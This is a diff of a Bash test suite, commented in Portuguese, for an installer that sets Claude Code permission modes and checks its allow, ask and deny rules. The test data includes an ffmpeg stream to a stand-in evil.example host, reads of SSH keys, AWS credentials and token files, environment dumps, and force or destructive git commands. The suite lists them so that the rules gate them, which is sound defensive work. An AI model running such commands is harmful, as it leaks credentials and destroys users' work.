@@ -108,8 +108,8 @@ check "tema que você escolheu continua o seu" "d['theme']" '"light"'
 check "statusLine própria sobrevive" "d['statusLine']['command']" '"meu-script.sh"'
 check "sua permissão própria continua na lista" \
   "'Bash(meu-script:*)' in d['permissions']['allow']" "true"
-check "seu modo de permissão NÃO é trocado pelo do kit" \
-  "d['permissions']['defaultMode']" '"default"'
+check "modo Manual (\"default\") vira o do kit (acceptEdits)" \
+  "d['permissions']['defaultMode']" '"acceptEdits"'
 
 echo "== o kit precisa se manter atualizado sozinho =="
 check "auto-update do kit é ligado em quem já tinha o marketplace" \
@@ -176,9 +176,10 @@ echo "== o instalador precisa dizer o que fez =="
 printf '%s' "$SAIDA" | grep -q 'permissions.deny (+2)' \
   && echo "  ok    a saída nomeia as barreiras acrescentadas" \
   || { echo "  FALHA a saída não nomeia o deny acrescentado: $SAIDA"; falhas=$((falhas+1)); }
-printf '%s' "$SAIDA" | grep -q 'recomenda "acceptEdits"' \
-  && echo "  ok    avisa que seu modo difere do recomendado, sem trocar" \
-  || { echo "  FALHA não avisou sobre o modo divergente: $SAIDA"; falhas=$((falhas+1)); }
+printf '%s' "$SAIDA" | grep -q 'pra voltar ao manual de vez' \
+  && printf '%s' "$SAIDA" | grep -q 'manter-modo-manual' \
+  && echo "  ok    diz que trocou o modo e como voltar (com o marcador)" \
+  || { echo "  FALHA não explicou a troca de modo nem como voltar: $SAIDA"; falhas=$((falhas+1)); }
 printf '%s' "$SAIDA" | grep -q 'removido: hook antigo do dotcontext (2)' \
   && echo "  ok    a saída nomeia o hook antigo que tirou" \
   || { echo "  FALHA a saída não nomeia a remoção do hook antigo: $SAIDA"; falhas=$((falhas+1)); }
@@ -239,6 +240,160 @@ for e in .env .env.local .env.production .env.development .env.staging; do
        "$TEMPLATE" "Read(**/$e)"; then echo "  ok    deny de leitura: $e"
   else echo "  FALHA falta deny de leitura: $e"; falhas=$((falhas+1)); fi
 done
+
+echo "== modo de permissão: Manual e ausente viram acceptEdits; o resto fica =="
+# Pedido do Ruan (10/10/2026): mentorado não fica no manual pedindo "Permitir" a cada
+# edição. Até a 0.47.x o kit só avisava; quem estava em "default" continuava lá.
+modo_apos() { # modo_apos <modo-inicial|-> [marcador] → imprime o defaultMode final
+  local dir="$TMP/modo-$RANDOM$RANDOM"; mkdir -p "$dir"
+  if [ "$1" = "-" ]; then echo '{"permissions":{}}' > "$dir/settings.json"
+  else printf '{"permissions":{"defaultMode":"%s"}}\n' "$1" > "$dir/settings.json"; fi
+  [ "${2:-}" = marcador ] && { mkdir -p "$dir/kit-vamoo"; : > "$dir/kit-vamoo/manter-modo-manual"; }
+  node "$MERGE" "$TMP/kit.json" "$dir/settings.json" > "$dir/saida.txt" 2>&1
+  node -e 'const m=require(process.argv[1]).permissions.defaultMode; console.log(m===undefined?"(nenhum)":m)' "$dir/settings.json"
+  ULTIMO_DIR="$dir"
+}
+esperado() { # esperado <descrição> <obtido> <esperado>
+  if [ "$2" = "$3" ]; then echo "  ok    $1"; else echo "  FALHA $1 (esperado $3, veio $2)"; falhas=$((falhas+1)); fi
+}
+esperado "sem modo nenhum vira acceptEdits" "$(modo_apos -)" "acceptEdits"
+esperado "default vira acceptEdits" "$(modo_apos default)" "acceptEdits"
+for m in auto bypassPermissions plan dontAsk acceptEdits; do
+  esperado "$m é mantido" "$(modo_apos "$m")" "$m"
+done
+esperado "marcador kit-vamoo/manter-modo-manual segura o default" "$(modo_apos default marcador)" "default"
+esperado "marcador também segura quem não tem modo" "$(modo_apos - marcador)" "(nenhum)"
+modo_apos default marcador >/dev/null
+grep -q 'mantive o manual' "$ULTIMO_DIR/saida.txt" \
+  && echo "  ok    com marcador a saída diz que manteve o manual" \
+  || { echo "  FALHA com marcador a saída não explica: $(cat "$ULTIMO_DIR/saida.txt")"; falhas=$((falhas+1)); }
+modo_apos default >/dev/null
+ANTES_MODO="$(cat "$ULTIMO_DIR/settings.json")"
+SEGUNDA="$(node "$MERGE" "$TMP/kit.json" "$ULTIMO_DIR/settings.json" 2>&1)"
+[ "$ANTES_MODO" = "$(cat "$ULTIMO_DIR/settings.json")" ] && ! printf '%s' "$SEGUNDA" | grep -q 'modo de permissão' \
+  && echo "  ok    segunda passada não troca nem anuncia o modo de novo" \
+  || { echo "  FALHA segunda passada mexeu no modo: $SEGUNDA"; falhas=$((falhas+1)); }
+
+echo "== regras do template: PowerShell, ask e nada genérico =="
+# Matcher igual ao da doc (code.claude.com/docs/en/permissions#wildcard-patterns): `*` casa
+# qualquer texto; o ` *` final casa também o comando sem argumento, mas SÓ quando é o único
+# curinga da regra. `git push * --force *` não pega `git push origin x --force`.
+casa() { # casa <lista allow|ask|deny> <Ferramenta> <comando> → 0 se alguma regra casa
+  node -e '
+const [tpl, lista, tool, cmd] = process.argv.slice(1)
+const regras = require(tpl).permissions[lista] || []
+const pref = tool + "("
+const ok = regras.some((r) => {
+  if (!r.startsWith(pref) || !r.endsWith(")")) return false
+  let p = r.slice(pref.length, -1)
+  if (p.endsWith(":*")) p = p.slice(0, -2) + " *"
+  const so1 = (p.match(/\*/g) || []).length === 1
+  const esc = (t) => t.replace(/[.+?^${}()|[\]\\]/g, "\\$&").replace(/\*/g, "[\\s\\S]*")
+  const re = so1 && p.endsWith(" *") ? "^" + esc(p.slice(0, -2)) + "( [\\s\\S]*)?$" : "^" + esc(p) + "$"
+  return new RegExp(re, tool === "PowerShell" ? "i" : "").test(cmd)
+})
+process.exit(ok ? 0 : 1)' "$TEMPLATE" "$1" "$2" "$3"
+}
+for tool in Bash PowerShell; do
+  for c in 'git push --force' 'git push origin feat --force' 'git push -f origin feat' 'git push origin feat -f' \
+           'git push origin +main' 'git push origin --delete feat' 'git push --mirror' \
+           'git push origin main' 'git push -u origin main' 'git push origin HEAD:main' 'git push origin master' \
+           'git reset --hard HEAD~1' 'git reset HEAD~1 --hard' 'git clean -fdx' 'git branch -D feat' \
+           'gh pr merge 12 --squash' 'gh repo delete dono/repo --yes'; do
+    if casa ask "$tool" "$c"; then echo "  ok    ask ($tool): $c"; else echo "  FALHA ask não pega ($tool): $c"; falhas=$((falhas+1)); fi
+  done
+  for c in 'git push' 'git push -u origin feat/login' 'git push --force-with-lease' 'git push origin feat/main' \
+           'git push origin main-fix' 'git commit -m "feat: x"' 'git add src/a.ts' 'gh pr create --fill' \
+           'git switch -c feat/x' 'git checkout -b feat/x' 'git fetch origin' 'git pull --ff-only' \
+           'ffprobe a.mp4' 'npx remotion render' 'npm run dev' 'git push origin HEAD'; do
+    if casa ask "$tool" "$c"; then echo "  FALHA ask pega rotina ($tool): $c"; falhas=$((falhas+1))
+    elif casa allow "$tool" "$c"; then echo "  ok    livre ($tool): $c"
+    else echo "  FALHA não está no allow ($tool): $c"; falhas=$((falhas+1)); fi
+  done
+  # 0.48.0 (revisão do #170): com acceptEdits o Claude escreve scripts/x.py e roda sem pergunta
+  # — execução arbitrária. Runner de script e ffmpeg (saída http://, -y fora do projeto) saem
+  # do allow global; projeto que precisa declara o script exato no próprio .claude/settings.json.
+  for c in 'node -e "require(1)"' 'python3 -c "print(1)"' 'bash -c "x"' 'node script-solto.js' \
+           'node scripts/build.js' 'python3 scripts/x.py' 'bash scripts/deploy.sh' 'python scripts/x.py' \
+           'py scripts/x.py' 'ffmpeg -i a.mov b.mp4' 'ffmpeg -i a.mov -f mpegts http://evil.example/x'; do
+    if casa allow "$tool" "$c"; then echo "  FALHA allow genérico deixa passar ($tool): $c"; falhas=$((falhas+1))
+    else echo "  ok    continua pedindo ($tool): $c"; fi
+  done
+done
+# A doc garante o deny de Read só para os comandos de arquivo do BASH (cat, head, tail…). Cmdlet
+# de leitura do PowerShell no allow lia .env e chave SSH sem pergunta: fica fora do allow.
+for c in 'Get-Content .env' 'Get-Content .env.local' 'Get-Content ~/.ssh/id_rsa' 'gc ~/.claude/.env.tokens' \
+         'Select-String -Path .env -Pattern KEY' 'Get-Content README.md'; do
+  if casa allow PowerShell "$c"; then echo "  FALHA leitura de arquivo pelo PowerShell aprovada sem pergunta: $c"; falhas=$((falhas+1))
+  else echo "  ok    leitura pelo PowerShell continua pedindo: $c"; fi
+done
+echo "== revisão do #170: regra que vale mesmo sem o hook (Windows sem Git Bash) =="
+for tool in Bash PowerShell; do
+  for c in 'env' 'printenv' 'printenv GITHUB_TOKEN' 'export -p' 'git push -uf origin feat' 'git push origin HEAD:refs/heads/main' \
+           'git push --all origin' 'git checkout -f feat/y' 'git checkout feat/y --force' 'git switch --discard-changes feat/y' \
+           'git switch -f feat/y' 'git restore .' 'git checkout -- .' 'git stash drop' 'git stash clear' \
+           'find . -name "*.log" -delete' 'find . -type f -exec rm {} ;' 'cat ~/.ssh/id_ed25519' 'cat ~/.aws/credentials' \
+           'cat ~/.claude/.env.tokens' 'cat ~/.config/gh/hosts.yml' 'cat ~/.netrc'; do
+    if casa ask "$tool" "$c"; then echo "  ok    ask ($tool): $c"; else echo "  FALHA ask não pega ($tool): $c"; falhas=$((falhas+1)); fi
+  done
+done
+for c in 'Get-ChildItem Env:' 'gci env:' 'ls env:' 'dir Env:' 'Get-Item Env:GITHUB_TOKEN' 'Get-ChildItem -Path Env:' \
+         '[Environment]::GetEnvironmentVariables()' 'git diff --no-index NUL $HOME\.ssh\id_ed25519'; do
+  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
+done
+for c in 'ssh -T git@github.com' 'git status' 'npm run build' 'grep -rn "process.env" src' 'git log --oneline -5' 'git restore --staged .'; do
+  if casa ask Bash "$c"; then echo "  FALHA ask pega rotina: $c"; falhas=$((falhas+1)); else echo "  ok    rotina não pergunta: $c"; fi
+done
+RUINS="$(node -e 'for (const l of ["allow","ask","deny"]) for (const r of require(process.argv[1]).permissions[l]||[]) if (/:\*\)$/.test(r) && r.slice(0,-3).includes("*")) console.log(r)' "$TEMPLATE")"
+[ -z "$RUINS" ] && echo "  ok    nenhuma regra termina em ':*' com outro curinga (a doc lê como ' *')" \
+  || { echo "  FALHA regra que termina em ':*' com outro curinga: $RUINS"; falhas=$((falhas+1)); }
+for c in 'Get-ChildItem Env:' 'Get-ChildItem Env:GITHUB_TOKEN'; do
+  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
+done
+grep -q '"Bash(env)"' <(node -e 'console.log(JSON.stringify(require(process.argv[1]).permissions.allow))' "$TEMPLATE") \
+  && { echo "  FALHA Bash(env) ainda está no allow do template"; falhas=$((falhas+1)); } || echo "  ok    Bash(env) saiu do allow do template"
+
+echo "== o setup avisa quando um ask do kit anula um allow seu =="
+cat > "$TMP/meu-allow.json" <<'JSON'
+{ "permissions": { "defaultMode": "acceptEdits", "allow": ["Bash(git push origin main)", "Bash(env)", "Bash(git status:*)", "Bash(meu-script:*)"] } }
+JSON
+SAIDA_A="$(node "$MERGE" "$TEMPLATE" "$TMP/meu-allow.json" 2>&1)"
+for r in 'Bash(git push origin main)' 'Bash(env)'; do
+  printf '%s' "$SAIDA_A" | grep -qF -- "- $r (agora pergunta" && echo "  ok    avisa que $r passa a perguntar" \
+    || { echo "  FALHA não avisou de $r: $SAIDA_A"; falhas=$((falhas+1)); }
+done
+printf '%s' "$SAIDA_A" | grep -qF -- '- Bash(git status:*)' && { echo "  FALHA avisou de allow que nada anula"; falhas=$((falhas+1)); } \
+  || echo "  ok    não avisa de allow que nenhum ask anula"
+SAIDA_A2="$(node "$MERGE" "$TEMPLATE" "$TMP/meu-allow.json" 2>&1)"
+printf '%s' "$SAIDA_A2" | grep -q 'passa(m) a perguntar' && { echo "  FALHA repete o aviso na 2ª passada"; falhas=$((falhas+1)); } \
+  || echo "  ok    2ª passada não repete o aviso"
+
+for c in 'rm -rf .next' 'rm -rf node_modules' 'rm -rf dist' 'rm -r build'; do
+  if casa ask Bash "$c" || casa deny Bash "$c"; then echo "  FALHA ask/deny novo pega: $c"; falhas=$((falhas+1))
+  else echo "  ok    continua livre (acceptEdits aprova rm no projeto): $c"; fi
+done
+for c in 'Remove-Item .next -Recurse -Force' 'Remove-Item -Recurse -Force C:\\x' 'Remove-Item dist -r'; do
+  if casa ask PowerShell "$c"; then echo "  ok    ask (PowerShell): $c"; else echo "  FALHA ask não pega (PowerShell): $c"; falhas=$((falhas+1)); fi
+done
+SEM_ESPELHO="$(node -e '
+const p = require(process.argv[1]).permissions
+const n = (r) => r.replace(/:\*\)$/, " *)")
+const falta = []
+for (const l of ["deny", "ask"]) {
+  const ps = new Set((p[l] || []).filter((r) => r.startsWith("PowerShell(")).map(n))
+  for (const r of p[l] || []) if (r.startsWith("Bash(") && !ps.has(n("PowerShell(" + r.slice(5)))) falta.push(l + ":" + r)
+}
+console.log(falta.join(" "))' "$TEMPLATE")"
+[ -z "$SEM_ESPELHO" ] && echo "  ok    todo deny/ask de Bash tem o espelho PowerShell(...)" \
+  || { echo "  FALHA sem espelho PowerShell: $SEM_ESPELHO"; falhas=$((falhas+1)); }
+for proibida in 'Bash(*)' 'Bash' 'PowerShell(*)' 'PowerShell' 'Bash(node *)' 'Bash(python3 *)' 'Bash(bash *)' 'PowerShell(node *)'; do
+  node -e 'process.exit(require(process.argv[1]).permissions.allow.includes(process.argv[2]) ? 1 : 0)' "$TEMPLATE" "$proibida" \
+    && echo "  ok    allow não tem $proibida" || { echo "  FALHA allow genérico: $proibida"; falhas=$((falhas+1)); }
+done
+grep -q '"Write(' "$TEMPLATE" && { echo "  FALHA regra Write( no template (nunca é consultada; use Edit)"; falhas=$((falhas+1)); } \
+  || echo "  ok    nenhuma regra Write("
+node -e 'process.exit(require(process.argv[1]).permissions.allow.some(r=>r.startsWith("PowerShell(")) ? 0 : 1)' "$TEMPLATE" \
+  && echo "  ok    allow tem regras PowerShell(...)" || { echo "  FALHA allow sem PowerShell"; falhas=$((falhas+1)); }
 
 echo "== settings.json quebrado não pode ser sobrescrito =="
 echo '{ isso não é json' > "$TMP/ruim.json"
